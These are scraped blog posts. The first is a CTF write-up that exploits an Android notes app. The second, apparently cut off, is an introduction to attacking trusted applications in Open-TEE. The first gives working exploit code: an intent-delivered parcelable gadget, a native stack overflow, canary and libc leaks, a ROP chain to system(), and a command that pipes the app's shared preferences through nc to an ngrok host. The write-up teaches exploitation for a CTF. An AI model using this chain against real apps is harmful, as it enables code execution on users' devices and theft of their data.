androidx.fragment.app.fragmentactivity, androidx.activity.componentactivity, androidx.core.app.componentactivity, android.app.activity protected void oncreate(bundle savedinstancestate) { super.oncreate(savedinstancestate); setcontentview(r.layout.activity_note_apiactivity); sharedpreferences sharedpreferences = getsharedpreferences(\u0026#34;com.inso.ins24.mynotes\u0026#34;, 0); list\u0026lt;string\u0026gt; notes = new arraylist\u0026lt;\u0026gt;(); hashset\u0026lt;string\u0026gt; noteset2 = (hashset) sharedpreferences.getstringset(\u0026#34;notes\u0026#34;, null); string new_note = getintent().getstringextra(\u0026#34;my_first_note\u0026#34;); system.loadlibrary(\u0026#34;ins24\u0026#34;); if (noteset2 != null \u0026amp;\u0026amp; !noteset2.isempty()) { finish(); } else if (new_note != null) { notes.add(\u0026#34;\u0026#34;); int noteid = notes.size() - 1; notes.set(noteid, new_note); notes.set(noteid, mainactivity.encrypt(string.valueof(new_note), new byte[]{65, 76, 71, 49, 0})); //alg1 sharedpreferences.edit().putstringset(\u0026#34;notes\u0026#34;, new hashset\u0026lt;\u0026gt;(notes)).apply(); finish(); } } } nothing interesting here. if no notes have ever been created, and the my_first_note extra string has been passed to the intent, then the provided note will be created and stored with the content specified by the invoking application.\nfinally, let\u0026rsquo;s take a look at what the native library does by loading it into ghidra. fortunately, the native library (libins24.so) is not stripped:\nchar* do_vigenere(char *str); char* rot13(char *s); _jstring * java_com_inso_ins24_utils_cryptoconfig_docipher( _jnienv *env,_jclass *clz,_jarray *algo,_jstring *note ) { int arr_alg_len; char *algo_str; char *pcvar1; char *pcvar2; _jstring *ret; char *note_c_str; note_c_str = (char *)_jnienv::getstringutfchars(env,note,null); arr_alg_len = _jnienv::getarraylength(env,algo); algo_str = get_algo(env,clz,(_jbytearray *)algo,arr_alg_len); pcvar1 = strstr(algo_str,\u0026#34;alg1\u0026#34;); if (pcvar1 == null) { pcvar2 = strstr(algo_str,\u0026#34;alg2\u0026#34;); if (pcvar2 != null) { note_c_str = rot13(note_c_str); //alg2 } } else { note_c_str = do_vigenere(note_c_str); //alg1 } ret = (_jstring *)_jnienv::newstringutf(env,note_c_str); return ret; } char* get_algo(_jnienv *env,_jclass *param_2, _jbytearray *arr, int arr_len) { byte *lvar1; long in_fs_offset; ulong i; byte buf [56]; long canary; canary = *(long *)(in_fs_offset + 0x28); lvar1 = (byte *)_jnienv::getbytearrayelements(env,arr, null); for (i=0; i\u0026lt;(ulong)(long)arr_len; i++) { buf[i] = lvar1[i]; } if (*(long *)(in_fs_offset + 0x28) == canary) { return (char *)buf; } /* warning: subroutine does not return */ __stack_chk_fail(); } some minor observations regarding the native layer:\nthere is no jni_onload. only one function is interfacing with the java layer: java_com_inso_ins24_utils_cryptoconfig_docipher get_algo returns a stack buffer. now this is a bug. get_algo loops arr_len times but the buf has fixed length of 56 bytes. since \u0026quot;alg1\u0026quot; and \u0026quot;alg2\u0026quot; are the only values passed to get_algo, this seems safe for now. rot13 corresponds to alg1 and do_vigenere to alg2. the vigenere algorithm also has a static key (keyinsokey) for all notes. so, the \u0026ldquo;encryption\u0026rdquo; is breakable in both cases. for the sake of completeness, let\u0026rsquo;s also examine the cryptoconfig class which declares the native function java_com_inso_ins24_utils_cryptoconfig_docipher:\npackage com.inso.ins24.utils; /* loaded from: classes3.dex */ public class cryptoconfig { private byte[] algo; private string in; public static native string docipher(byte[] barr, string str); protected void finalize() throws throwable { super.finalize(); docipher(this.algo, this.in); } } weird. why would it invoke docipher in its destructor? the docipher does not save the result in the sharedpreferences. anyway.\nbug, bug, where are you bug? at this point we can be staring at our application and never find the bug. the reason is that we have to dig and abuse android internals a bit.\none notorious thing with android intents, is that they get unparceled quite aggressively. this has been abused since 2015 and also to exploit the paypal app in 2021.\nlet\u0026rsquo;s check the android source code ourselves:\n// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/intent.java;l=8932;bpv=0 public class intent implements parcelable, cloneable { @unsupportedappusage private bundle mextras; public boolean hasextra(string name) { return mextras != null \u0026amp;\u0026amp; mextras.containskey(name); } public @nullable string getstringextra(string name) { return mextras == null ? null : mextras.getstring(name); } } public class basebundle { // https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/basebundle.java;l=697;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0 public boolean containskey(string key) { unparcel(); // \u0026lt;----------------------- return mmap.containskey(key); } // https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/basebundle.java;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0;l=1414 public string getstring(@nullable string key) { unparcel(); // \u0026lt;----------------------- final object o = mmap.get(key); try { return (string) o; } catch (classcastexception e) { typewarning(key, o, \u0026#34;string\u0026#34;, e); return null; } } /** * if the underlying data are stored as a parcel, unparcel them * using the currently assigned class loader. */ @unsupportedappusage final void unparcel() { unparcel(/* itemwise */ false); } /** deserializes the underlying data and each item if {@code itemwise} is true. */ final void unparcel(boolean itemwise) { //... } } so, when our target app simply checks the existence of extras in intents, without actually retrieving the objects, the intents\u0026rsquo; data will get automatically deserialized (unparceled()). with this in mind, let\u0026rsquo;s examine again the target application for any interesting objects that implement serializable or parcelable so that we can pass them from our app to the target app:\npackage com.inso.ins24.utils; import android.os.parcel; import android.os.parcelable; import com.google.gson.gson; import com.google.gson.gsonbuilder; /* loaded from: classes3.dex */ public class jsonbuilder implements parcelable { public static final parcelable.creator\u0026lt;jsonbuilder\u0026gt; creator = new parcelable.creator\u0026lt;jsonbuilder\u0026gt;() { // from class: com.inso.ins24.utils.jsonbuilder.1 /* jadx warn: can\u0026#39;t rename method to resolve collision */ @override // android.os.parcelable.creator public jsonbuilder[] newarray(int i) { return new jsonbuilder[i]; } /* jadx warn: can\u0026#39;t rename method to resolve collision */ @override // android.os.parcelable.creator public jsonbuilder createfromparcel(parcel parcel) { return new jsonbuilder(parcel); } }; private static final gson json = new gsonbuilder().create(); public object data; private jsonbuilder(parcel parcel) { try { /* returns the class object associated with the class or interface with the given string name public static class\u0026lt;?\u0026gt; forname(string classname); this method deserializes the specified json into an object of the specified class. public \u0026lt;t\u0026gt; t fromjson(java.lang.string json, java.lang.class\u0026lt;t\u0026gt; classoft); */ this.data = json.fromjson(parcel.readstring(), (class\u0026lt;object\u0026gt;) class.forname(parcel.readstring())); } catch (classnotfoundexception e) { throw new runtimeexception(e); } } @override // android.os.parcelable public int describecontents() { return 0; } @override // android.os.parcelable public void writetoparcel(parcel parcel, int i) { parcel.writestring(this.data.getclass().getcanonicalname()); parcel.writestring(json.tojson(this.data)); } } now this class is interesting. it is parcelable, which means that we can pass instances of this class through intents. it also lucrative from an attacker\u0026rsquo;s perspective. basically what the jsonbuilder class does is that it allows the user to serialize and deserialize arbitrary objects. so, by crafting a malicious intent where we pass a jsonbuilder object as extra, we can instantiate arbitrary objects in the target application.\nit is interesting that the jsonbuilder class is never used by the target application, yet we can leverage this class to exploit the target application.\nhello memory corruption one class of interest that we can use for instantiation through an intent containing a jsonbuilder parcel is the cryptoconfig class:\npackage com.inso.ins24.utils; public class cryptoconfig { private byte[] algo; private string in; public static native string docipher(byte[] barr, string str); protected void finalize() throws throwable { super.finalize(); docipher(this.algo, this.in); } } the reason that we choose this class is because it has a custom finalize() method and hence it can do some action (docipher()) in the native layer with data that we specify through our intent. can we somehow achieve memory corruption by controlling cryptoconfig.algo and cryptoconfig.in while the native docipher is being executed?\n_jstring * java_com_inso_ins24_utils_cryptoconfig_docipher( _jnienv *env,_jclass *clz,_jarray *algo,_jstring *note ) { int arr_alg_len; char *algo_str; char *note_c_str; note_c_str = (char *)_jnienv::getstringutfchars(env,note,null); arr_alg_len = _jnienv::getarraylength(env,algo); algo_str = get_algo(env,clz,(_jbytearray *)algo,arr_alg_len); //... } char* get_algo(_jnienv *env,_jclass *param_2, _jbytearray *arr, int arr_len) { byte *lvar1; long in_fs_offset; ulong i; byte buf [56]; long canary; canary = *(long *)(in_fs_offset + 0x28); lvar1 = (byte *)_jnienv::getbytearrayelements(env,arr, null); for (i=0; i\u0026lt;(ulong)(long)arr_len; i++) { buf[i] = lvar1[i]; } if (*(long *)(in_fs_offset + 0x28) == canary) { return (char *)buf; } /* warning: subroutine does not return */ __stack_chk_fail(); } there it is! the get_algo function has a buffer overflow in the for loop that we deemed safe earlier. we are passing an attacker-controlled arr and arr_len (cryptoconfig.algo) to the get_algo function. the buf has size 56 bytes only. we can smash the stack!\nexploitation through intents let\u0026rsquo;s create a minimal poc application that smashes the stack:\n\u0026lt;!-- androidmanifest.xml --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;manifest xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; xmlns:tools=\u0026#34;http://schemas.android.com/tools\u0026#34; package=\u0026#34;com.example.insomnipwn\u0026#34;\u0026gt; \u0026lt;application android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:roundicon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:theme=\u0026#34;@style/theme.myapplication\u0026#34;\u0026gt; \u0026lt;activity android:name=\u0026#34;.mainactivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.main\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.launcher\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;/application\u0026gt; \u0026lt;/manifest\u0026gt; //java/com/example/insomnipwn/mainactivity.kt package com.example.insomnipwn import android.content.intent import android.os.bundle import android.util.log import android.widget.button import android.widget.toast import androidx.appcompat.app.appcompatactivity import com.inso.ins24.utils.cryptoconfig import com.inso.ins24.utils.jsonbuilder class mainactivity : appcompatactivity() { private external fun buildpayload(): bytearray companion object { init { system.loadlibrary(\u0026#34;mynativelib\u0026#34;); } } override fun oncreate(savedinstancestate: bundle?) { super.oncreate(savedinstancestate) setcontentview(r.layout.activity_main) val pwnbutton = findviewbyid\u0026lt;button\u0026gt;(r.id.pwnbutton) pwnbutton.setonclicklistener { //construct the malicious parcelable object val in = \u0026#34;data\u0026#34; val algo = buildpayload(); val evilcryptoconfig = cryptoconfig(algo, in) val evilparcelable = jsonbuilder(evilcryptoconfig) //send malicious intent val intent = intent() intent.setclassname(\u0026#34;com.inso.ins24\u0026#34;, \u0026#34;com.inso.ins24.noteapiactivity\u0026#34;) intent.putextra(\u0026#34;my_first_note\u0026#34;, \u0026#34;note\u0026#34;) intent.putextra(\u0026#34;foo\u0026#34;, evilparcelable) startactivity(intent) log.i(\u0026#34;[insomnipwn]\u0026#34;,\u0026#34;intent sent!\u0026#34;) toast.maketext(this, \u0026#34;intent sent!\u0026#34;, toast.length_short).show(); } } } // cpp/main.cpp #include \u0026lt;cstdlib\u0026gt; #include \u0026#34;jni.h\u0026#34; extern \u0026#34;c\u0026#34; jniexport jbytearray jnicall java_com_example_insomnipwn_mainactivity_buildpayload(jnienv *env, jobject thiz) { size_t payload_len = 0x100; char *payload = static_cast\u0026lt;char *\u0026gt;(calloc(payload_len, sizeof(char))); memset(payload, 0x41, payload_len); jbytearray res = env-\u0026gt;newbytearray(payload_len); env-\u0026gt;setbytearrayregion(res, 0, payload_len, reinterpret_cast\u0026lt;const jbyte *\u0026gt;(payload)); return res; } we also need to copy the jsonbuilder and cryptoconfig classes from our target app and place them under the same package name:\n// java/com/inso/ins24/utils/cryptoconfig.java package com.inso.ins24.utils; public class cryptoconfig { /* implementation omitted. same as original app */ } // java/com/inso/ins24/utils/jsonbuilder.java package com.inso.ins24.utils; public class jsonbuilder implements parcelable { /* implementation omitted. same as original app */ } let\u0026rsquo;s build our malicious application and run it!\nonce we click the \u0026ldquo;pwn!\u0026rdquo; button, the malicious intnet is constructed and sent to the target application. and we have stack corruption! we effectively control pc. very interesting to see that by simply sending a malicious intent from our application to the target application we are able to completely take control over its execution!\nwhat is actually happening here under the hood is that:\nwe create a jsonbuilder object that contains a cryptoconfig object. we create an intent that is to be delivered to the com.inso.ins24 package and more specifically to its .noteapiactivity activity. we add the key-value string extra my_first_note=note to the intent. we serialzie the jsonbuilder object and add it to the intent under the key foo. we send our malicious intent to the com.inso.ins24 package (target app). the target application receives our malicious intent. the target application passes the intent to its .noteapiactivity activity. its oncreate() method is invoked. the code getintent().getstringextra(\u0026quot;my_first_note\u0026quot;) in the target activity will force the deserialization of the intent\u0026rsquo;s objects (unparcel()). the jsonbuilder.creator.createfromparcel will be invoked, which in turns invokes the constructor jsonbuilder(parcel). this method will instantiate a cryptoconfig object from the parcel\u0026rsquo;s json data and save it in the jsonbuilder.data instance field. we return from getstringextra() and the control flow in oncreate() continiues. finish() is eventually invoked. when finish() is invoked on an activity, the ondestroy() method of that activity is executed [1], basically indicating that the activity is no longer needed and should be closed. [2]. now the activity will get closed and we will be back to our malicious application. so, when is cryptoconfig.finalize() invoked to trigger our memory corruption?\nwell, this is kind of random. all the parent resources related to the deserialized cryptoconfig instance (e.g. parcel, intent, activity, etc.) are no longer needed as the com.inso.ins24.noteapiactivity instance was destroyed. so, it is up to the garbage collector to kick-in and invoke finalize() to clean up the cryptoconfig instance. once that happens, the docipher(this.algo, this.in) will be executed as part of the overriden implementation of cryptoconfig.finalize() and our memory corruption will finally manifest!\ndebugging environment since we are entering the exploitation phase, let\u0026rsquo;s quickly setup our debugging environment. in the emulator, we already have su and do not have to deal with selinux. we further push frida-server in /data/local/tmp. this small frida snippet can tell us if our intents get delivered as expected:\njava.perform(function() { java.use(\u0026#34;com.inso.ins24.noteapiactivity\u0026#34;).oncreate.implementation = function(a1) { console.log(\u0026#34;oncreate invoked\u0026#34;) return this.oncreate(a1) } console.log(\u0026#34;hooks initialized\u0026#34;); }) next, we also setup gdb:\nfind $android_home -name gdbserver | grep android-x86_64 adb push $android_home/ndk-bundle/prebuilt/android-x86_64/gdbserver/gdbserver /data/local/tmp adb shell su chmod ug+x /data/local/tmp/gdbserver /data/local/tmp/gdbserver :7777 --attach `pidof com.inso.ins24` next, we run the gdb client on our host machine:\nadb forward tcp:7777 tcp:7777 gdb (gdb) target remote 127.0.0.1:7777 (gdb) b *get_algo+0xa8 (gdb) continue defeating the canary as shown earlier, we were able to smash the stack through a continious buffer overflow. yet we do not know the canary. what now?\nremember our runtime envrionment! we are in android. more specifically, we are one malicious application trying to pwn another application. all applications in android are forked from the zygote64 process. this process is basically an optimization so that application spawning is fast.\nsince all processes are forked from zygote64, all processes have the same stack canary value (changing canary value after a fork() would be a total mess). yes, the stack canary is useless in our threat model. we can simply leak the canary value from our own memroy space:\n// cpp/main.cpp #define log_tag \u0026#34;[native_insomnipwn]\u0026#34; #include \u0026lt;android/log.h\u0026gt; #define alogi(...) __android_log_print(android_log_info, log_tag, __va_args__) #define aloge(...) __android_log_print(android_log_error, log_tag, __va_args__) //apktool d app-debug.apk //then, load the libmynativelib.so to ghidra to validate static __attribute__((noinline)) __attribute__((optnone)) uint64_t canaryleaker() { char *canaryptr = (char*)(\u0026amp;canaryptr)+0x08; //bunch of prints that should force the canary on the stack alogi(\u0026#34;canaryleaker= 0x%llx\u0026#34;, canaryleaker); alogi(\u0026#34;jni_onload= 0x%llx\u0026#34;, jni_onload); alogi(\u0026#34;canaryptr stored @ 0x%llx\u0026#34;, \u0026amp;canaryptr); alogi(\u0026#34;canary addr= 0x%llx\u0026#34;, canaryptr); return *(uint64_t*)canaryptr; } extern \u0026#34;c\u0026#34; jniexport jbytearray jnicall java_com_example_insomnipwn_mainactivity_buildpayload(jnienv *env, jobject thiz) { uint64_t canary = canaryleaker(); alogi(\u0026#34;canary= 0x%llx\u0026#34;, canary); //... } leaking libc how about leaking libc? well, there is no need to leak libc from the target application. as all android applications are forked from zygote64 and libc.so is mapped in zygote64, libc.so is mapped in all applications at the same address ranges. so, we can simply read /proc/self/maps to get the base address of libc.so:\n// cpp/main.cpp int ends_with(const char *str, const char *suffix) { if (!str || !suffix) return 0; size_t lenstr = strlen(str); size_t lensuffix = strlen(suffix); if (lensuffix \u0026gt; lenstr) return 0; return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0; } static uint64_t libcleaker() { uint64_t libc_base = null; char * line = null; size_t line_len = 0; file *fp = fopen(\u0026#34;/proc/self/maps\u0026#34;, \u0026#34;r\u0026#34;); if (fp == null) { aloge(\u0026#34;failed to open /proc/self/maps\u0026#34;); return null; } while (getline(\u0026amp;line, \u0026amp;line_len, fp) != -1) { //trim line endings if(line_len \u0026gt; 0) line_len = strlen(line); if(line_len \u0026gt; 0 \u0026amp;\u0026amp; line[line_len-1] == \u0026#39;\\n\u0026#39;) line[--line_len] = \u0026#39;\\0\u0026#39;; if(ends_with(line, \u0026#34;/libc.so\u0026#34;)) { void *addr_start, *addr_end; sscanf(line, \u0026#34;%p-%p\u0026#34;, \u0026amp;addr_start, \u0026amp;addr_end); libc_base = reinterpret_cast\u0026lt;uint64_t\u0026gt;(addr_start); break; } } fclose(fp); if(line) free(line); return libc_base; } let\u0026rsquo;s try out our payload so far:\n// cpp/main.cpp template\u0026lt;typename t\u0026gt; static void write_buf(void *buf, size_t *len, t val) { char *cptr = reinterpret_cast\u0026lt;char *\u0026gt;(buf); memcpy(cptr+*len, \u0026amp;val, sizeof(val)); *len += sizeof(val); } #define write_u8(buf, len, val) write_buf((buf), (len), (uint8_t)(val)) #define write_u64(buf, len, val) write_buf((buf), (len), (uint64_t)(val)) extern \u0026#34;c\u0026#34; jniexport jbytearray jnicall java_com_example_insomnipwn_mainactivity_buildpayload(jnienv *env, jobject thiz) { uint64_t canary = canaryleaker(); uint64_t libc_base = libcleaker(); alogi(\u0026#34;canary= 0x%llx\u0026#34;, canary); alogi(\u0026#34;libc base= 0x%llx\u0026#34;, libc_base); char *payload = static_cast\u0026lt;char *\u0026gt;(calloc(0x1000, sizeof(char))); size_t payload_len = 0; for(int i=0; i\u0026lt;56; i++) { write_u8(payload, \u0026amp;payload_len, 0x41); //padding } write_u64(payload, \u0026amp;payload_len, canary); write_u64(payload, \u0026amp;payload_len, 0x4242424242424242); //rbp write_u64(payload, \u0026amp;payload_len, 0x4343434343434343); //pc jbytearray res = env-\u0026gt;newbytearray(payload_len); env-\u0026gt;setbytearrayregion(res, 0, payload_len, reinterpret_cast\u0026lt;const jbyte *\u0026gt;(payload)); return res; } perfect! the crash that we get is a sigsegv at 0x4343434343434343 and there is no stack corruption detected (-fstack-protector) message shown this time. this means that we successfully bypassed the canary. here are also the logs from our malicious app:\nexfiltrating data we have control of pc and now we need to read the sharedpreference file /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml. the victim application has no way to pass back data to our malicious application via the intent that we sent it. however, the victim application has android.permission.internet. so we will send the sharedprefernce file over newtork to our host machine.\nnote: even if the victim application did not have android.permission.internet, we could still copy the sharedpreference file in external storage (e.g. in /sdcard/download). afterwards, our malicious application could read it and then use its own android.permission.internet permission to send/leak it from the remote machine to a server that we control.\nto avoid the hassle with nats, we will use ngrok. so, we spawn one terminal with ngrok tcp 5000 and another with nc -lnvp 5000. we will execute the below command in the context of the victim application via a rop chain:\ncat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | \\ nc \u0026lt;ngrok pub ip\u0026gt; \u0026lt;ngrok pub port\u0026gt; building a rop chain we have control of pc and a libc leak. so, it is now just a matter of finding the correct gadgets to invoke system(cmd). when we are at get_algo+0xa9: pc=ret;, this is how the registers look like:\n$rax : 0x000077031bb80a10 → \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]\u0026#34; $rsi : 0x000077031bb80910 → 0x00007704f8927f00 → 0x00000000005c0000 $rdi : 0x000077031bb80900 → 0x00007703005c0000 $r8 : 0x000077031bb808f8 → 0x00007703e8914460 → \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]\u0026#34; $r9 : 0x60 $r12 : 0x000077031bb80d40 → 0x000077031bb81090 → 0x000077031bb812e0 → 0x000077031bb81470 → 0x000077031bb815f0 → 0x000077031bb81810 → 0x0000000000000000 $r14 : 0x000077031bb80f90 → 0x0000000000000000 $rax points to our payload buffer (return value) on the stack. $rdi is also pointing in the stack. how convenient for $rdi! we will add some constants to $rdi so that we make it point to our cmd buffer in the stack and then invoke system(cmd). using ropper it was easy to find the gadget add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret; in libc.\nso, here is our final payload:\n// cpp/main.cpp uint64_t gadget__add_rdi_0x90 = libc_base+0x00000000000cae06; // 0x00000000000cae06: add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret; uint64_t gadget__noop = libc_base+0x000000000007a60a; // 0x000000000007a60a: ret; uint64_t system__addr = libc_base + 0x6f190; // system@@libc char *payload = static_cast\u0026lt;char *\u0026gt;(calloc(0x1000, sizeof(char))); size_t payload_len = 0; for(int i=0; i\u0026lt;56; i++) { write_u8(payload, \u0026amp;payload_len, 0x41); //padding } write_u64(payload, \u0026amp;payload_len, canary); write_u64(payload, \u0026amp;payload_len, 0x4242424242424242); //rbp write_u64(payload, \u0026amp;payload_len, gadget__add_rdi_0x90); //pc write_u64(payload, \u0026amp;payload_len, 0x4141414141414141); //pop rbx write_u64(payload, \u0026amp;payload_len, gadget__add_rdi_0x90); //pc write_u64(payload, \u0026amp;payload_len, 0x4141414141414141); //pop rbx write_u64(payload, \u0026amp;payload_len, gadget__add_rdi_0x90); //pc write_u64(payload, \u0026amp;payload_len, 0x4141414141414141); //pop rbx write_u64(payload, \u0026amp;payload_len, gadget__noop); //pc. stack-alignment fix for movaps write_u64(payload, \u0026amp;payload_len, system__addr); //pc alogi(\u0026#34;payload len until pop pc=system; 0x%zx\u0026#34;, payload_len); while(payload_len \u0026lt; 0xa0) { write_u8(payload, \u0026amp;payload_len, 0x41); //padding } //terminal1: ngrok tcp 5000 //terminal2: nc -lnvp 5000 const char *ngrok_pub_addr = \u0026#34;4.tcp.eu.ngrok.io\u0026#34;; const int ngrok_pub_port = 14991; std::string cmd = std::string(\u0026#34;cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | nc \u0026#34;) + std::string(ngrok_pub_addr) + std::string(\u0026#34; \u0026#34;) + std::to_string(ngrok_pub_port); alogi(\u0026#34;using command: %s\u0026#34;, cmd.c_str()); write_string(payload, \u0026amp;payload_len, cmd.c_str()); finally, we run our application, send the malicious the intent, and receive the flag in our ngrok callback!\n","title":"How dare you Intent to pwn me! - Insomni'hack teaser 2024"},{"date":"2023-12-31","image":"/post-resources/TrustMEE/i-trusted-you-meme.jpg","imageAlt":"","link":"https://chalkiadakis.me/posts/lakectf23/trust-mee/","summary":"A beginner-friendly guide to start pwning TAs from the REE.","tags":["ctf","environment setup","lakeCTF","pwn","TA","TEE"],"text":"categories: pwn\ndescription:\nthe grades are stored securely in a trusted execution environment, maybe just learning for the course would have been easier\u0026hellip;\nnc chall.polygl0ts.ch 9002\nauthors: lakectf 2023 organizers\ndockerfile, grade_ta.so, grade_ca.c, grade_ca.h, run.sh, opentee.conf, exploit_template.py\n1. introduction in this challenge, we are presented with a trusted application (ta) and our goal is to pwn it. we will write a client application (ca) that communicates with the ta through the os and tee environment. the focus of this writeup will be audience with no or little experience in tee exploitation, ta development, and environment setup. we will assume that the reader has a high level understanding of what a tee is but no knowledge of how a ta works or is implemented.\nin this challenge, the ta is running inside open-tee, which is an open-source project implementing a \u0026ldquo;virtual tee\u0026rdquo; compliant with the recent globalplatform tee specifications. the globalplatform tee specifications are nothing more than just \u0026ldquo;specifications\u0026rdquo;, i.e. they describes what apis are available and their behavior for a ta and a ca to use. the implementation of those apis is left to actual tee implementation such as open-tee, op-tee, teegris, etc and to kernel drivers.\nwith that said, one thing to clear out of the way is that open-tee and op-tee are two different things. both are tee implementations but their goal is different. open-tee is an emulation of an actual tee, with the goal of facilitating developers and researchers to write tas without any actual hardware. there is no real memory isolation mechanism in-place. the kernel and the tee run with the same privileges. on the other hand, op-tee, is a tee implementation designed as companion to a linux kernel running on arm; cortex-a cores using the trustzone technology. op-tee is designed primarily to rely on the arm trustzone technology as the underlying hardware isolation mechanism.\nalthough in this challenge the ta is not running under a real hardware-based tee, the exploitation process remains the same. if you are interested in more about open-tee, you can optionally read its paper: open-tee — an open virtual trusted execution environment [paper].\n2. reversing the ta in this challenge, we are not given the source code of the ta. instead, we are just given the grade_ta.so binary.\nfortunately, the binary is not stripped. so, let\u0026rsquo;s load it into ghidra. here are the functions defined in this ta:\nbut now what? there are a few things that we need to understand before we jump into reversing:\nthe structure of a ta the lifecycle of a ta how to communicate with a ta 3. detour! ta crash course! as an example ta implementation, we will use the digest_ta example provided by open-tee. this is a ta which you simply give a buffer as parameter and the ta calculates the hash for you. of course there is no real meaning in such a ta to exist other than demonstration purposes.\nthe source code of the ta is found in example_digest_ta.c. an example ca implementation is shown in example_sha1_ca.c which performs some sha1 hashing.\nthe open-tee implements the version 1.0.26 of the gp core api. several items were raised to gp during the implementation of open-tee which resulted in the release of version 1.1.\nthe tee internal core api is the api that is exposed to the tas and can be found in tee internal core api v1.1. the the tee client api describes and defines how a ca running in the ree should communicate with tas running in the tee and can be bound in tee client api v1.0.\n3.1 ta structure and lifecycle trusted applications are command-oriented. a ca opens a session with them and invokes commands within those sessions. tas are uniquely identifiable by a uuid. that uuid is used by cas to specify which ta they wish to communicate with. let\u0026rsquo;s examine the sha1 example:\n/* uuid must be unique */ set_ta_properties( { 0x12345678, 0x8765, 0x4321, { \u0026#39;d\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;} }, /* uuid */ 512, /* datasize */ 255, /* stacksize */ 1, /* singletoninstance */ 1, /* multisession */ 1) /* instancekeepalive */ first, some properties are defined for the ta. the uuid of this ta is { 0x12345678, 0x8765, 0x4321, { 'd', 'i', 'g', 'e', 's', 't', '0', '0'} }, which is of type tee_uuid. next, data sizes. next, it defines that this is a single instance ta. generally, tas can be either multi-instance or single-instance. multi-instance means that each session opened by a client is directed to a separate ta instance, created on demand when the session is opened and destroyed when the session closes. single-instance on the other hand means that all sessions opened by the clients are directed to a single ta instance.\nnext, the multisession is set to enabled. this means that the ta can accept multiple concurrent sessions. this property only makes sense for single-instance tas and for multi-instance tas it is ignored. if multisession is not enabled and the ta already has an active session, other cas attempting to establish a session will fail.\nfinally, instancekeepalive is set to enabled. this means that the ta instance will be preserved when there are no sessions connected to it.\nhere is also the definition of the set_ta_properties macro and the struct holding the ta properties from the source code of open-tee:\n#define property_sec_name \u0026#34;.ta_properties\u0026#34; #define set_ta_properties(...) \\ struct gpd_ta_config ta_pro __attribute__((section(property_sec_name))) = { __va_args__ }; struct gpd_ta_config { tee_uuid appid; size_t datasize; size_t stacksize; bool singletoninstance; bool multisession; bool instancekeepalive; }; as we can see, the ta properteis are stored in the .ta_properties section header. so, when we reverse our ta we should look for that section. let\u0026rsquo;s continue with analyzing the sha1 example:\n/* hash ta command ids */ #define hash_update 0x00000001 #define hash_do_final 0x00000002 #define hash_reset 0x00000003 /* hash algorithm identifier */ #define hash_md5 0x00000001 #define hash_sha1 0x00000002 tee_result ta_export ta_createentrypoint(void) { ot_log(log_err, \u0026#34;calling the create entry point\u0026#34;); return tee_success; } void ta_export ta_destroyentrypoint(void) { ot_log(log_err, \u0026#34;calling the destroy entry point\u0026#34;); } tee_result ta_export ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext) { algorithm_identifier hash; /* ... determine which hash algorithm to use based on parameters ... */ return tee_allocateoperation((tee_operationhandle *)sessioncontext, hash, tee_mode_digest, 0); } void ta_export ta_closesessionentrypoint(void *sessioncontext) { ot_log(log_err, \u0026#34;calling the close session entry point\u0026#34;); tee_freeoperation(sessioncontext); } tee_result ta_export ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]) { tee_result tee_rv = tee_success; /* ... parse command and execute it ... */ return tee_rv; } let\u0026rsquo;s focus on the following functions:\ntee_result ta_createentrypoint(void); void ta_destroyentrypoint(void); tee_result ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext); void ta_closesessionentrypoint(void *sessioncontext); tee_result ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]); these functions are very similar to what we saw earlier in ghidra:\nthey represent the lifecycle of a ta. when a ta instance is created, the ta_createentrypoint function is invoked — and when the instance is destroyed, ta_destroyentrypoint is invoked. both functions are called only once in the lifetime of a ta instance.\nwhen a client attempts to open a session with the ta, ta_opensessionentrypoint is invoked. the client can pass up to 4 parameters to the ta when establishing the session. when the client releases the session, ta_closesessionentrypoint is invoked. a session is used to logically connect multiple commands invoked in a ta. each session has its own state.\nta_invokecommandentrypoint is invoked when the client invokes any command on the ta. a command is issued within the context of a session and contains a command identifier, which is a 32-bit integer (uint32_t commandid), and four operation parameters, which can contain integer values or references to client-owned shared memory blocks (uint32_t paramtypes, tee_param params[4]) it is up to the ta to define the combinations of commands and their parameters that are valid to execute.\nthe above functions are called entry points. all entry point calls within a given ta instance are called in sequence, i.e. no more than one entry point is executed at any point in time. the trusted core framework implementation guarantees that a commenced entry point call is completed before any new entry point call is allowed to begin execution. it is not possible to execute multiple concurrent commands within a session. the tee guarantees that a pending command has completed before a new command is executed. since all entry points of a given ta instance are called in sequence, 